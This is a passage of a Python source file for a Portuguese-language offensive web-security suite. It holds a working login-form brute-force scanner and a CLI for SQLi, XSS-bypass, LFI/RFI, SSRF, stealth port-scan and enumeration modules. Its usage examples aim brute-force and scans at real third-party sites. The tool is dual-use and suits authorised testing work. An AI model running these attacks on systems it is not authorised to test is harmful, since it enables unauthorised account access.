                        progress.update(
                            task_id, 
                            advance=1,
                            current_combo=f"[red]Timeout: {current_attempt}[/red]",
                            failures=self.statistics['failed_attempts']
                        )

        # Processa resultados
        if found_credential:
            self._add_finding("Alto", "Credencial Válida Encontrada", 
                            f"Usuário: {found_credential[0]}, Senha: {found_credential[1]}", 
                            "Alterar credenciais padrão e implementar políticas de senha forte")
        
        if not return_findings:
            self._present_findings()
        
        return self.findings if return_findings else None
    
    def _present_findings(self):
        """Apresenta os resultados encontrados."""
        console.print("-" * 60)
        
        if self.findings:
            console.print("[bold green on black] ✅ CREDENCIAL ENCONTRADA! ✅ [/bold green on black]")
            
            table = Table(title="Resultados do Brute Force")
            table.add_column("Risco", justify="center")
            table.add_column("Tipo", style="cyan")
            table.add_column("Detalhe", style="magenta")
            table.add_column("Recomendação", style="white")
            
            for finding in self.findings:
                table.add_row(finding["Risco"], finding["Tipo"], finding["Detalhe"], finding["Recomendação"])
            
            console.print(table)
        else:
            console.print("[bold yellow][-] Nenhuma credencial válida encontrada[/bold yellow]")
        
        console.print("-" * 60)

def validate_brute_force_args(url, user_field, pass_field, username, user_list_path, pass_wordlist_path,
                              failure_string, success_string, workers, delay, attack_mode, max_retries,
                              backoff_factor, session_pool_size):
    """Valida argumentos do brute force e fornece feedback detalhado."""
    errors = []
    warnings = []
    
    # Validação de URL
    if not url:
        errors.append("URL é obrigatória")
    elif not url.startswith(('http://', 'https://')):
        warnings.append(f"URL '{url}' não possui protocolo, assumindo http://")
    
    # Validação de campos do formulário
    if not user_field or not user_field.strip():
        errors.append("Campo de usuário (--user-field) é obrigatório")
    if not pass_field or not pass_field.strip():
        errors.append("Campo de senha (--pass-field) é obrigatório")
    
    # Validação de wordlist
    if not pass_wordlist_path:
        errors.append("Wordlist de senhas (-w/--wordlist) é obrigatória")
    elif not os.path.exists(pass_wordlist_path):
        errors.append(f"Arquivo de wordlist '{pass_wordlist_path}' não encontrado")
    elif os.path.getsize(pass_wordlist_path) == 0:
        errors.append(f"Arquivo de wordlist '{pass_wordlist_path}' está vazio")
    
    # Validação de strings de detecção
    if not failure_string and not success_string:
        errors.append("Pelo menos um de --failure-string ou --success-string deve ser fornecido")
    
    # Validação de modo de ataque e usuários
    if attack_mode == 'battering_ram':
        if not username:
            errors.append("Modo 'battering_ram' requer --username")
    elif attack_mode in ['pitchfork', 'cluster_bomb']:
        if not user_list_path:
            errors.append(f"Modo '{attack_mode}' requer --user-list")
        elif not os.path.exists(user_list_path):
            errors.append(f"Arquivo de usuários '{user_list_path}' não encontrado")
        elif os.path.getsize(user_list_path) == 0:
            errors.append(f"Arquivo de usuários '{user_list_path}' está vazio")
    
    # Validação de parâmetros numéricos
    if workers <= 0 or workers > 50:
        warnings.append(f"Número de workers ({workers}) fora do recomendado (1-50)")
    if delay < 0:
        errors.append("Delay não pode ser negativo")
    elif delay < 0.1:
        warnings.append(f"Delay muito baixo ({delay}s) pode causar rate limiting")
    if max_retries <= 0 or max_retries > 10:
        warnings.append(f"Max retries ({max_retries}) fora do recomendado (1-10)")
    if backoff_factor <= 1.0 or backoff_factor > 5.0:
        warnings.append(f"Backoff factor ({backoff_factor}) fora do recomendado (1.1-5.0)")
    if session_pool_size <= 0 or session_pool_size > 100:
        warnings.append(f"Session pool size ({session_pool_size}) fora do recomendado (1-100)")
    
    return errors, warnings

def print_brute_force_config(url, user_field, pass_field, username, user_list_path, pass_wordlist_path,
                             failure_string, success_string, workers, delay, attack_mode, max_retries,
                             backoff_factor, session_pool_size, enable_logging):
    """Exibe configuração detalhada do ataque de força bruta."""
    console.print("\n[bold cyan]═══ CONFIGURAÇÃO DO ATAQUE ═══[/bold cyan]")
    
    # Informações básicas
    config_table = Table(title="Parâmetros Principais", show_header=True, header_style="bold magenta")
    config_table.add_column("Parâmetro", style="cyan", width=20)
    config_table.add_column("Valor", style="yellow", width=40)
    config_table.add_column("Descrição", style="white", width=30)
    
    config_table.add_row("URL Alvo", url, "Página de login")
    config_table.add_row("Campo Usuário", user_field, "Nome do campo no HTML")
    config_table.add_row("Campo Senha", pass_field, "Nome do campo no HTML")
    config_table.add_row("Modo de Ataque", attack_mode, "Estratégia de teste")
    
    if attack_mode == 'battering_ram' and username:
        config_table.add_row("Usuário Fixo", username, "Usuário para testar")
    elif user_list_path:
        config_table.add_row("Lista Usuários", user_list_path, "Arquivo com usuários")
    
    config_table.add_row("Wordlist Senhas", pass_wordlist_path, "Arquivo com senhas")
    
    if failure_string:
        config_table.add_row("String Falha", failure_string, "Indica login falhado")
    if success_string:
        config_table.add_row("String Sucesso", success_string, "Indica login bem-sucedido")
    
    console.print(config_table)
    
    # Parâmetros avançados
    advanced_table = Table(title="Parâmetros Avançados", show_header=True, header_style="bold green")
    advanced_table.add_column("Parâmetro", style="cyan", width=20)
    advanced_table.add_column("Valor", style="yellow", width=15)
    advanced_table.add_column("Recomendação", style="white", width=35)
    
    advanced_table.add_row("Workers", str(workers), "1-5 para sites pequenos")
    advanced_table.add_row("Delay", f"{delay}s", "1.5-3.0s para evitar bloqueios")
    advanced_table.add_row("Max Retries", str(max_retries), "3-5 para conexões instáveis")
    advanced_table.add_row("Backoff Factor", str(backoff_factor), "1.5-3.0 para retry suave")
    advanced_table.add_row("Session Pool", str(session_pool_size), "5-20 para performance")
    advanced_table.add_row("Logging", "Ativado" if enable_logging else "Desativado", "Ative para debugging")
    
    console.print(advanced_table)
    
    # Estatísticas da wordlist
    try:
        with open(pass_wordlist_path, 'r', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
        
        wordlist_info = Table(title="Informações da Wordlist", show_header=True, header_style="bold yellow")
        wordlist_info.add_column("Métrica", style="cyan")
        wordlist_info.add_column("Valor", style="yellow")
        
        wordlist_info.add_row("Total de Senhas", str(len(passwords)))
        if passwords:
            wordlist_info.add_row("Senha Mais Curta", str(min(len(p) for p in passwords)))
            wordlist_info.add_row("Senha Mais Longa", str(max(len(p) for p in passwords)))
            wordlist_info.add_row("Tamanho Médio", f"{sum(len(p) for p in passwords) / len(passwords):.1f}")
        
        console.print(wordlist_info)
    except Exception:
        pass
    
    # Informações de usuários
    if attack_mode == 'battering_ram' and username:
        total_combinations = len(passwords) if 'passwords' in locals() else 0
    elif user_list_path and os.path.exists(user_list_path):
        try:
            with open(user_list_path, 'r', errors='ignore') as f:
                users = [line.strip() for line in f if line.strip()]
            if attack_mode == 'cluster_bomb':
                total_combinations = len(users) * len(passwords) if 'passwords' in locals() else 0
            else:  # pitchfork
                total_combinations = min(len(users), len(passwords)) if 'passwords' in locals() else 0
        except Exception:
            total_combinations = 0
    else:
        total_combinations = 0
    
    if total_combinations > 0:
        estimated_time = (total_combinations * delay) / workers
        console.print(f"\n[bold white]Total de Combinações:[/bold white] [yellow]{total_combinations}[/yellow]")
        console.print(f"[bold white]Tempo Estimado:[/bold white] [yellow]{estimated_time:.1f}s ({estimated_time/60:.1f}min)[/yellow]")
    
    console.print("\n[bold red]⚠️  AVISO:[/bold red] [white]Use apenas em sistemas que você possui ou tem autorização explícita para testar[/white]")
    console.print("[bold cyan]═══════════════════════════════[/bold cyan]\n")

def brute_force_scan(url, user_field, pass_field, username, user_list_path, pass_wordlist_path,
                     failure_string, success_string, workers, delay, attack_mode, max_retries=3,
                     backoff_factor=2.0, session_pool_size=10, enable_logging=False):
    """Executa ataque de força bruta em formulários de login com capacidades aprimoradas e validações robustas."""
    
    # Valida argumentos
    errors, warnings = validate_brute_force_args(url, user_field, pass_field, username, user_list_path, 
                                                 pass_wordlist_path, failure_string, success_string, 
                                                 workers, delay, attack_mode, max_retries, 
                                                 backoff_factor, session_pool_size)
    
    # Exibe erros e para execução se houver
    if errors:
        console.print("\n[bold red]═══ ERROS DE VALIDAÇÃO ═══[/bold red]")
        for error in errors:
            console.print(f"[bold red]✗[/bold red] {error}")
        console.print("[bold red]═══════════════════════════[/bold red]")
        return
    
    # Exibe avisos se houver
    if warnings:
        console.print("\n[bold yellow]═══ AVISOS ═══[/bold yellow]")
        for warning in warnings:
            console.print(f"[bold yellow]⚠[/bold yellow] {warning}")
        console.print("[bold yellow]═════════════[/bold yellow]")
    
    # Exibe configuração detalhada
    print_brute_force_config(url, user_field, pass_field, username, user_list_path, pass_wordlist_path,
                            failure_string, success_string, workers, delay, attack_mode, max_retries,
                            backoff_factor, session_pool_size, enable_logging)
    
    # Confirmação do usuário para ataques grandes
    try:
        with open(pass_wordlist_path, 'r', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
        
        if attack_mode == 'battering_ram':
            total_combinations = len(passwords)
        elif attack_mode == 'cluster_bomb' and user_list_path:
            with open(user_list_path, 'r', errors='ignore') as f:
                users_count = len([line.strip() for line in f if line.strip()])
            total_combinations = users_count * len(passwords)
        else:
            total_combinations = len(passwords)
        
        if total_combinations > 100:
            console.print(f"\n[bold yellow]⚠️  Ataque com {total_combinations} combinações pode ser detectado![/bold yellow]")
            response = input("Deseja continuar? (s/N): ").strip().lower()
            if response not in ['s', 'sim', 'y', 'yes']:
                console.print("[yellow]Ataque cancelado pelo usuário.[/yellow]")
                return
    except Exception:
        pass
    
    # Prepara lista de usuários baseada no modo de ataque
    users = []
    if attack_mode == 'battering_ram':
        users = [username]
    elif attack_mode in ['pitchfork', 'cluster_bomb']:
        try:
            with open(user_list_path, 'r', errors='ignore') as f:
                users = [line.strip() for line in f if line.strip()]
        except Exception as e:
            console.print(f"[bold red][!] Erro ao ler arquivo de usuários: {e}[/bold red]")
            return

    # Cria e executa scanner
    scanner = BruteForceScanner(url, user_field, pass_field, users, pass_wordlist_path,
                                failure_string, success_string, workers, delay, attack_mode)
    scanner.run_scan()

# --- INTERFACE DE LINHA DE COMANDO ---

def main():
    display_banner()
    
    parser = argparse.ArgumentParser(
        description="Spectra - Web Security Suite. Uma ferramenta para análise de segurança web.",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""
Exemplos de Uso:
----------------

  [ Análise Completa ]
  # Executa uma análise completa, ignorando o cache de CVEs e gerando um relatório HTML
  python %(prog)s full-scan -u http://testphp.vulnweb.com/ --no-cache -o relatorio.html

  [ Scanning de Vulnerabilidades ]
  # Procura por falhas de SQL Injection com nível 3 (inclui Time-Based e OAST) e focado em MySQL
  python %(prog)s sql-scan -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --level 3 --dbms mysql

  # Executa um scan OAST (Out-of-Band) para confirmação definitiva de SQLi (requer nível 3)
  python %(prog)s sql-scan -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --level 3 --collaborator-url "seu-dominio.oast.me"

  # Scan XSS básico com detecção context-aware e bypass automático
  python %(prog)s xss-scan -u "http://testphp.vulnweb.com/guestbook.php"
  
  # Scan XSS completo com stored XSS e payloads personalizados
  python %(prog)s xss-scan -u "http://testphp.vulnweb.com/guestbook.php" --scan-stored --custom-payloads payloads/xss.txt
  
  # Scan XSS avançado com modo verbose para análise detalhada
  python %(prog)s xss-scan -u "http://xss-game.appspot.com/level1/frame" --verbose --scan-stored

  # Scanner LFI/RFI avançado com detecção de bypass e múltiplas técnicas
  python %(prog)s lfi-scan -u "http://testphp.vulnweb.com/listproducts.php?cat=1"
  
  # Scanner LFI com timeout personalizado e exportação de resultados
  python %(prog)s lfi-scan -u "https://demo.testfire.net/bank/queryxpath.aspx" --timeout 15 --export
  
  # Scanner LFI com múltiplas threads para melhor performance
  python %(prog)s lfi-scan -u "https://portswigger-labs.net/lfi_lab" --threads 10 --timeout 20
  
  # Scanner LFI com modo verbose para análise detalhada das técnicas
  python %(prog)s lfi-scan -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --verbose --export
  
  # Scanner LFI em modo rápido (10x mais rápido, técnicas otimizadas)
  python %(prog)s lfi-scan -u "https://demo.testfire.net/bank/main.aspx" --fast --threads 15
  
  # Scanner LFI completo com máxima performance e para na primeira vulnerabilidade
  python %(prog)s lfi-scan -u "http://dvwa.local/vulnerabilities/fi/" --threads 20 --stop-on-first --fast

  # Procura por CVEs para OpenSSL, ignorando o cache e filtrando por CVSS
  python %(prog)s cve-scan --product openssl --version 1.0.2 --min-cvss 7.0 --no-cache

  [ Scanner de Força Bruta (Refatorado) ]
  # Modo Battering Ram: um usuário contra múltiplas senhas
  python %(prog)s brute-force -u https://hackthissite.org/login --user-field "username" --pass-field "password" --username "admin" -w wordlist.txt --failure-string "Invalid username" --workers 3 --delay 1.5
  
  # Modo Cluster Bomb: múltiplos usuários contra múltiplas senhas
  python %(prog)s brute-force -u https://root-me.org/login --user-field "login" --pass-field "password" --user-list users.txt -w passwords.txt --attack-mode cluster_bomb --success-string "Welcome" --workers 2 --delay 2.0
  
  # Modo Pitchfork: testa pares de credenciais do arquivo (formato usuario:senha)
  python %(prog)s brute-force -u https://overthewire.org/login --user-field "username" --pass-field "password" --user-list credentials.txt --attack-mode pitchfork --failure-string "Access denied" --workers 1 --delay 3.0
  
  # Com opções avançadas: retry logic, session pooling e logging
  python %(prog)s brute-force -u https://example.com/login --user-field "user" --pass-field "pass" --username "admin" -w passwords.txt --max-retries 5 --backoff-factor 1.5 --session-pool-size 15 --enable-logging --workers 3 --delay 2.0

  [ Reconhecimento & Enumeração ]
  # Scan básico de portas comuns
  python %(prog)s scan -t google.com -p 80,443,22,21,25,53,110,143,993,995
  
  # Scan completo com detecção de serviços e banner grabbing
  python %(prog)s scan -t 192.168.1.1 -p 1-1024 --timeout 2 --workers 100
  
  # Scan stealth com delay e menos workers (menos detectável)
  python %(prog)s scan -t example.com -p 80,443,8080,8443 --stealth
  
  # Scan UDP (DNS, DHCP, SNMP, etc.)
  python %(prog)s scan -t target.com -p 53,67,69,123,161,514 --scan-type udp
  
  # Scan com output em JSON para parsing automático
  python %(prog)s scan -t 10.0.0.1 -p 22,80,443 --output json
  
  # Scan com configurações customizadas
  python %(prog)s scan -t server.local -p 1-65535 --timeout 0.5 --delay 10 --workers 200
  
  # Discovery básico de diretórios e arquivos
  python %(prog)s discover -u https://example.com -w wordlists/common.txt
  
  # Discovery avançado com modo recursivo e detecção de WAF
  python %(prog)s discover -u https://target.com -w wordlists/big.txt --recursive --max-depth 3 --workers 50
  
  # Discovery em modo stealth com fuzzing de extensões
  python %(prog)s discover -u https://site.com -w wordlist.txt --stealth --timeout 15 --extensions
  
  # Discovery com output em JSON para integração
  python %(prog)s discover -u https://api.example.com -w wordlists/api.txt --output json --no-extensions

  [ Análise DNS & Subdomínios Avançada ]
  # Análise básica de DNS com todos os registros comuns
  python %(prog)s dns -d example.com
  
  # Consulta específica de registros MX para análise de email
  python %(prog)s dns -d company.com -t MX
  
  # Análise completa de DNS com verificações de segurança (DNSSEC, Zone Transfer, etc.)
  python %(prog)s dns -d target.com -t ALL
  
  # Scanner de subdomínios básico com detecção de wildcard DNS
  python %(prog)s subdomain -d example.com -w wordlists/subdomains.txt
  
  # Scanner de subdomínios avançado com detecção de subdomain takeover
  python %(prog)s subdomain -d target.com -w wordlists/subdomains-top1million.txt --workers 50
  
  # Análise de DNS reverso para IP único
  python %(prog)s reverse-dns -t 8.8.8.8
  
  # Análise de DNS reverso para domínio (resolve IPs automaticamente)
  python %(prog)s reverse-dns -t cloudflare.com

  [ Detecção de Tecnologias Web Avançada ]
  # Detecção básica de tecnologias web
  python %(prog)s tech-detect -u https://example.com
  
  # Análise verbose com detecção de DNS e subdomínios
  python %(prog)s tech-detect -u https://target.com --verbose
  
  # Output em JSON para análise automatizada
  python %(prog)s tech-detect -u https://api.site.com --output json
  
  # Output em XML para integração com outras ferramentas
  python %(prog)s tech-detect -u https://company.com --output xml --verbose

  [ Utilitários ]
  # Visualiza o conteúdo de um ficheiro online (ex: robots.txt)
  python %(prog)s view -u https://www.google.com/robots.txt

Para ajuda sobre um comando específico, use: python %(prog)s [comando] --help
"""
    )
    subparsers = parser.add_subparsers(dest='tool', title='Comandos Disponíveis', help='Descrição', required=True)

    # --- Grupo de Análise Completa ---
    parser_full = subparsers.add_parser('full-scan', help='[Completo] Executa todos os scans, incluindo CVEs, e gera um relatório.')
    parser_full.add_argument('-u', '--url', required=True, help='URL base para a análise completa.')
    parser_full.add_argument('-o', '--output', help='Ficheiro HTML para guardar o relatório (ex: relatorio.html).')
    parser_full.add_argument('--min-cvss', type=float, default=0.0, help='[CVE] Filtra CVEs com pontuação CVSS mínima (ex: 7.0).')
    parser_full.add_argument('--no-cache', action='store_true', help='[CVE] Ignora o cache local e força uma nova consulta à API.')
    
    # --- Grupo de Scanning de Vulnerabilidades ---
    parser_sql = subparsers.add_parser('sql-scan', help='[Scan] Procura por falhas de SQL Injection.')
    parser_sql.add_argument('-u', '--url', required=True, help='URL base para iniciar a verificação.')
    parser_sql.add_argument('--level', type=int, default=1, choices=range(1, 4), help='Nível do scan (1-3): 1=Error, 2=+Boolean/Union, 3=+Time/OAST. Padrão: 1')
    parser_sql.add_argument('--dbms', help='Força o uso de payloads para um DBMS específico (ex: mysql, mssql, oracle).')
    parser_sql.add_argument('--collaborator-url', help='URL do servidor OAST (ex: Burp Collaborator) para testes Out-of-Band.')

    parser_xss = subparsers.add_parser('xss-scan', help='[Scan] Scanner XSS avançado com detecção context-aware, bypass de WAF e análise de CSP.')
    parser_xss.add_argument('-u', '--url', required=True, help='URL base para iniciar a verificação.')
    parser_xss.add_argument('--custom-payloads', help='Caminho para ficheiro com payloads XSS personalizados (um por linha). Se não especificado, usa base de 150+ payloads categorizados.')
    parser_xss.add_argument('--scan-stored', action='store_true', help='Ativa verificação de XSS Armazenado (Stored) com análise aprimorada de formulários e CSRF.')
    parser_xss.add_argument('--fuzz-dom', action='store_true', help='Ativa análise de XSS baseado em DOM usando headless browser (requer Selenium).')
    parser_xss.add_argument('--enable-bypasses', action='store_true', default=True, help='Ativa técnicas de bypass automáticas (encoding, WAF evasion). Padrão: ativado.')
    parser_xss.add_argument('--context-analysis', action='store_true', default=True, help='Ativa detecção context-aware (HTML, atributos, JavaScript, CSS). Padrão: ativado.')
    parser_xss.add_argument('--validate-execution', action='store_true', default=True, help='Ativa validação de execução JavaScript através de análise de resposta. Padrão: ativado.')
    parser_xss.add_argument('--analyze-csp', action='store_true', default=True, help='Ativa análise de Content Security Policy (CSP). Padrão: ativado.')
    parser_xss.add_argument('--verbose', action='store_true', help='Exibe informações detalhadas sobre contextos detectados, WAFs e técnicas de bypass.')


    parser_cmd = subparsers.add_parser('cmd-scan', help='[Scan] Procura por falhas de Injeção de Comandos.')
    parser_cmd.add_argument('-u', '--url', required=True, help='URL base para iniciar a verificação.')
    
    parser_lfi = subparsers.add_parser('lfi-scan', help='[Scan] Scanner avançado de LFI/RFI com 86+ payloads e múltiplas técnicas de bypass.')
    parser_lfi.add_argument('-u', '--url', required=True, help='URL base para iniciar a verificação.')
    parser_lfi.add_argument('-t', '--timeout', type=int, default=10, help='Timeout para requisições em segundos (padrão: 10)')
    parser_lfi.add_argument('--threads', type=int, default=5, help='Número de threads para processamento paralelo (padrão: 5, máx: 20)')
    parser_lfi.add_argument('--export', action='store_true', help='Exportar resultados para arquivo JSON')
    parser_lfi.add_argument('--verbose', action='store_true', help='Exibe informações detalhadas sobre técnicas de bypass, detecções e progresso do scan.')
    parser_lfi.add_argument('--fast', action='store_true', help='Modo rápido: usa apenas técnicas de bypass mais eficazes (10x mais rápido)')
    parser_lfi.add_argument('--stop-on-first', action='store_true', help='Para após encontrar primeira vulnerabilidade de alto risco')

    parser_ssrf = subparsers.add_parser('ssrf-scan', help='[Scan] Procura por falhas de Server-Side Request Forgery (SSRF).')
    parser_ssrf.add_argument('-u', '--url', required=True, help='URL base para iniciar a verificação.')
    
    parser_redirect = subparsers.add_parser('open-redirect-scan', help='[Scan] Procura por falhas de Redirecionamento Aberto.')
    parser_redirect.add_argument('-u', '--url', required=True, help='URL base para iniciar a verificação.')

    parser_vuln = subparsers.add_parser('vuln-scan', help='[Scan] Executa uma verificação de configurações de segurança básicas.')
    parser_vuln.add_argument('-u', '--url', required=True, help='URL base do site para verificar.')

    parser_cve = subparsers.add_parser('cve-scan', help='[Scan] Procura por CVEs para um software e versão específicos.')
    parser_cve.add_argument('--product', required=True, help='Nome do produto (ex: apache, wordpress, openssl).')
    parser_cve.add_argument('--version', required=True, help='Versão do produto (ex: 2.4.41, 5.8.1).')
    parser_cve.add_argument('--min-cvss', type=float, default=0.0, help='Filtra resultados com uma pontuação CVSS mínima (ex: 7.0).')
    parser_cve.add_argument('--no-cache', action='store_true', help='Ignora o cache local e força uma nova consulta à API.')
    
    parser_brute = subparsers.add_parser('brute-force', help='[Scan] Scanner de força bruta para formulários de login (refatorado).')
    parser_brute.add_argument('-u', '--url', required=True, help='URL da página contendo o formulário de login.')
    parser_brute.add_argument('--user-field', required=True, help='Nome do campo de usuário no formulário (atributo "name").')
    parser_brute.add_argument('--pass-field', required=True, help='Nome do campo de senha no formulário (atributo "name").')
    parser_brute.add_argument('-w', '--wordlist', required=True, help='Caminho para o arquivo de wordlist de senhas.')
    parser_brute.add_argument('--username', help='Usuário específico para modo battering_ram (um usuário, múltiplas senhas).')
    parser_brute.add_argument('--user-list', help='Arquivo com lista de usuários para modos cluster_bomb e pitchfork.')
    parser_brute.add_argument('--failure-string', help='String que indica falha no login (ex: "Invalid credentials").')
    parser_brute.add_argument('--success-string', help='String que indica sucesso no login (ex: "Welcome"). Alternativa ao --failure-string.')
    parser_brute.add_argument('--workers', type=int, default=5, help='Número de threads concorrentes (padrão: 5, recomendado: 1-5).')
    parser_brute.add_argument('--delay', type=float, default=1.0, help='Delay em segundos entre requisições (padrão: 1.0, recomendado: 1.5-3.0).')
    parser_brute.add_argument('--attack-mode', default='battering_ram', choices=['battering_ram', 'pitchfork', 'cluster_bomb'], help='Modo: battering_ram (1 user), cluster_bomb (N users x N passwords), pitchfork (pares user:pass).')
    parser_brute.add_argument('--max-retries', type=int, default=3, help='Número máximo de tentativas por requisição (padrão: 3).')
    parser_brute.add_argument('--backoff-factor', type=float, default=2.0, help='Fator de backoff exponencial para retry (padrão: 2.0).')
    parser_brute.add_argument('--session-pool-size', type=int, default=10, help='Tamanho do pool de sessões HTTP (padrão: 10).')
    parser_brute.add_argument('--enable-logging', action='store_true', help='Habilita logging detalhado das operações.')


    # --- Grupo de Reconhecimento & Enumeração ---
    parser_scan = subparsers.add_parser('scan', help='[Recon] Scanner avançado de portas com detecção de serviços.')
    parser_scan.add_argument('-t', '--target', required=True, help='Host ou endereço IP do alvo.')
    parser_scan.add_argument('-p', '--ports', required=True, help="Portas para escanear (ex: '1-1024', '80,443', '22').")
    parser_scan.add_argument('--workers', type=int, default=50, help='Número de threads (padrão: 50).')
    parser_scan.add_argument('--grab-banner', action='store_true', help='Captura banners automaticamente (sempre ativo no modo avançado).')
    parser_scan.add_argument('--scan-type', choices=['tcp', 'syn', 'udp'], default='tcp', help='Tipo de scan (padrão: tcp).')
    parser_scan.add_argument('--timeout', type=float, default=1.0, help='Timeout por porta em segundos (padrão: 1.0).')
    parser_scan.add_argument('--delay', type=int, default=0, help='Delay entre scans em ms (padrão: 0).')
    parser_scan.add_argument('--output', choices=['table', 'json', 'xml'], default='table', help='Formato de output (padrão: table).')
    parser_scan.add_argument('--stealth', action='store_true', help='Modo stealth (timeout alto, delay, menos workers).')

    parser_discover = subparsers.add_parser('discover', help='[Recon] Scanner avançado de diretórios e arquivos com detecção inteligente.')
    parser_discover.add_argument('-u', '--url', required=True, help='URL base do site alvo.')
    parser_discover.add_argument('-w', '--wordlist', required=True, help='Caminho para o ficheiro da wordlist.')
    parser_discover.add_argument('--workers', type=int, default=30, help='Número de threads (padrão: 30).')
    parser_discover.add_argument('--timeout', type=int, default=10, help='Timeout por requisição em segundos (padrão: 10).')
    parser_discover.add_argument('--recursive', action='store_true', help='Realizar uma varredura recursiva.')
    parser_discover.add_argument('--max-depth', type=int, default=3, help='Profundidade máxima para recursão (padrão: 3).')
    parser_discover.add_argument('--stealth', action='store_true', help='Modo stealth com delays entre requisições.')
    parser_discover.add_argument('--extensions', action='store_true', default=True, help='Ativa fuzzing de extensões baseado em tecnologias detectadas (padrão: ativo).')
    parser_discover.add_argument('--no-extensions', dest='extensions', action='store_false', help='Desativa fuzzing de extensões.')
    parser_discover.add_argument('--output', choices=['table', 'json', 'xml'], default='table', help='Formato de output (padrão: table).')

    parser_subdomain = subparsers.add_parser('subdomain', help='[Recon] Encontra subdomínios de um domínio.')
    parser_subdomain.add_argument('-d', '--domain', required=True, help='O domínio alvo para escanear.')
    parser_subdomain.add_argument('-w', '--wordlist', required=True, help='Caminho para a wordlist de subdomínios.')
    parser_subdomain.add_argument('--workers', type=int, default=100, help='Número de threads (padrão: 100).')

    parser_dns = subparsers.add_parser('dns', help='[Recon] Consulta registros DNS de um domínio.')
    parser_dns.add_argument('-d', '--domain', required=True, help='O domínio para consultar.')
    parser_dns.add_argument('-t', '--type', default='ALL', help="Tipo de registro (A, MX, TXT, etc.) ou 'ALL' para os mais comuns.")

    parser_reverse_dns = subparsers.add_parser('reverse-dns', help='[Recon] Análise avançada de DNS reverso.')
    parser_reverse_dns.add_argument('-t', '--target', required=True, help='IP ou domínio para análise de DNS reverso.')

    parser_crawl = subparsers.add_parser('crawl', help='[Recon] Extrai todos os links e recursos de uma página web.')
    parser_crawl.add_argument('-u', '--url', required=True, help='URL inicial para o crawling.')
    parser_crawl.add_argument('--depth', type=int, default=1, help='Profundidade máxima do crawling (padrão: 1).')
    parser_crawl.add_argument('-o', '--output', help='Arquivo para salvar a lista de recursos encontrados.')

    parser_whois = subparsers.add_parser('whois', help='[Recon] Obtém informações de registo WHOIS de um domínio.')
    parser_whois.add_argument('-d', '--domain', required=True, help='Domínio para consultar o WHOIS.')

    parser_tech = subparsers.add_parser('tech-detect', help='[Recon] Deteta tecnologias web (servidor, framework, etc).')
    parser_tech.add_argument('-u', '--url', required=True, help='URL do site para analisar.')
    parser_tech.add_argument('--verbose', action='store_true', help='Exibe informações detalhadas durante a detecção.')
    parser_tech.add_argument('--output', choices=['table', 'json', 'xml'], default='table', help='Formato de output (padrão: table).')

    parser_waf = subparsers.add_parser('waf-detect', help='[Recon] Deteta a presença de um Web Application Firewall (WAF).')
    parser_waf.add_argument('-u', '--url', required=True, help='URL base do site para verificar.')

    # --- Grupo de Utilitários ---
    parser_grab = subparsers.add_parser('grab', help='[Util] Captura o banner de um serviço numa porta específica.')
    parser_grab.add_argument('-t', '--target', required=True, help='Host ou endereço IP do alvo.')
    parser_grab.add_argument('-p', '--port', required=True, type=int, help='Porta específica para capturar o banner.')

    parser_meta = subparsers.add_parser('meta', help='[Util] Extrai metadados EXIF de uma imagem a partir de um URL.')
    parser_meta.add_argument('-u', '--url', required=True, help='URL direto da imagem.')

    parser_headers = subparsers.add_parser('headers', help='[Util] Analisa os cabeçalhos de resposta HTTP de uma URL.')
    parser_headers.add_argument('-u', '--url', required=True, help='URL para analisar os cabeçalhos.')
    
    parser_ssl = subparsers.add_parser('ssl-info', help='[Util] Analisa o certificado SSL/TLS de um host.')
    parser_ssl.add_argument('-d', '--domain', required=True, help='Host para analisar o certificado (ex: google.com).')
    parser_ssl.add_argument('-p', '--port', type=int, default=443, help='Porta do serviço SSL/TLS (padrão: 443).')

    parser_view = subparsers.add_parser('view', help='[Util] Visualiza o conteúdo de um arquivo a partir de um URL.')
    parser_view.add_argument('-u', '--url', required=True, help='URL direto do arquivo para visualizar.')

    args = parser.parse_args()

    if args.tool == 'scan':
        # Modo stealth ajusta parâmetros para ser menos detectável
        if args.stealth:
            timeout = max(args.timeout, 2.0)  # mínimo 2s
            delay = max(args.delay, 100)      # mínimo 100ms
            workers = min(args.workers, 10)   # máximo 10 workers
        else:
            timeout = args.timeout
            delay = args.delay
            workers = args.workers
        
        # Usa o scanner avançado
        results = advanced_port_scan(
            host=args.target,
            port_spec=args.ports,
            scan_type=args.scan_type,
            timeout=timeout,
            delay=delay,
            workers=workers,
            output_format=args.output
        )
        
        # Output especial para JSON/XML
        if args.output == 'json':
            print(results)
        elif args.output == 'xml':
            print(results)
    elif args.tool == 'grab':
        grab_banner(args.target, args.port)
    elif args.tool == 'discover':
        # Usa o scanner avançado de diretórios
        all_found_paths = advanced_directory_scan(
            base_url=args.url,
            wordlist_path=args.wordlist,
            workers=args.workers,
            timeout=args.timeout,
            recursive=args.recursive,
            max_depth=args.max_depth,
            stealth=args.stealth,
            extension_fuzzing=args.extensions,
            output_format=args.output
        )
        
        # Output especial para JSON/XML já é tratado dentro da função
        if args.output == 'json':
            pass  # JSON já foi impresso pela função
        elif args.output == 'xml':
            pass  # XML já foi impresso pela função
        # Para table format, a exibição também é feita pela função
    elif args.tool == 'meta':
        extract_metadata(args.url)
    elif args.tool == 'subdomain':
        discover_subdomains(args.domain, args.wordlist, args.workers)
    elif args.tool == 'dns':
        query_dns(args.domain, args.type)
    elif args.tool == 'reverse-dns':
        analyze_reverse_dns(args.target)
    elif args.tool == 'crawl':
        crawl_links(args.url, args.depth, args.output)
    elif args.tool == 'whois':
        get_whois_info(args.domain)
    elif args.tool == 'headers':
        get_http_headers(args.url)
    elif args.tool == 'ssl-info':
        get_ssl_info(args.domain, args.port)
    elif args.tool == 'tech-detect':
        detect_technologies(args.url, verbose=args.verbose, output_format=args.output)
    elif args.tool == 'waf-detect':
        detect_waf(args.url)
    elif args.tool == 'vuln-scan':
        vuln_scan(args.url)
    elif args.tool == 'sql-scan':
        sql_injection_scan(args.url, args.level, args.dbms, args.collaborator_url)
    elif args.tool == 'xss-scan':
        xss_scan(args.url, 
                custom_payloads_file=args.custom_payloads, 
                scan_stored=args.scan_stored, 
                fuzz_dom=args.fuzz_dom,
                enable_bypasses=getattr(args, 'enable_bypasses', True),
                context_analysis=getattr(args, 'context_analysis', True),
